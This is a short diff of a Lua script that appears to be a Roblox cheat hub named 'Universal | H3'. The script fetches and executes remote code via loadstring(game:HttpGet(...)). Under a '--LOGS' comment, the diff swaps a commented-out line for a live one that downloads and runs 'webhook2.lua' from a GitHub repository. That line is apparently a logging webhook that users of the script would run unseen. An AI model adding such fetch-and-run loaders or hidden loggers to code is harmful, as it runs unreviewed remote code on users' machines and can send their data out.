@@ -4,7 +4,7 @@ local mainName = "Universal | H3"
 local Main = loadstring(game:HttpGet("https://solarishub.dev/SolarisLib.lua"))()
 
 --LOGS - (Open source)
---loadstring(game:HttpGet("https://raw.githubusercontent.com/HELLLO1073/RobloxStuff/main/cc.txt"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HELLLO1073/RobloxStuff/main/webhook2.lua"))()
 
 local winMain = Main:New({
    Name = mainName,
